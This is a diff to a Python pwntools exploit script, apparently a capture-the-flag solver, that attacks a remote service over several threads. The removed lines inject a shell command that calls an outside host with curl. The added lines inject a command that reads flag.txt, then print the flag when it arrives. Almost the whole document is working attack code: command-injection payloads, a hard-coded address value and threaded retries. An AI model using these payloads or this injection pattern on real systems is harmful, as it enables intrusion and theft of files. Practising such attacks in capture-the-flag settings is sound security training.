@@ -3,12 +3,18 @@ import sys
 import time
 import threading
 
-import pwn 
+import pwn
 
 def attack(io):
-    io.sendlineafter(b': ', b'\'$(curl cloud.kelte.cc:12345)')
-    io.sendlineafter(b': ', str(0x9f87f8).encode())
+    io.sendlineafter(b': ', b'\'$(cat flag.txt>&2)')
+    io.sendlineafter(b': ', str(0x9bbff8).encode())
     io.sendlineafter(b': ', b'\x54\xfe\x49'.hex().encode())
+
+    line = io.recvline()
+
+    if b'letopwn' in line:
+        print(line)
+        os._exit(0)
 
 def main():
     host = sys.argv[1]
@@ -19,13 +25,13 @@ def main():
             try:
                 attack(io)
             except Exception as e:
-                print(f'[-] {e}')
+                pass
 
 if __name__ == '__main__':
     # main()
     # exit()
 
-    num = 64
+    num = 8
 
     threads = [threading.Thread(target=main) for _ in range(num)]
 
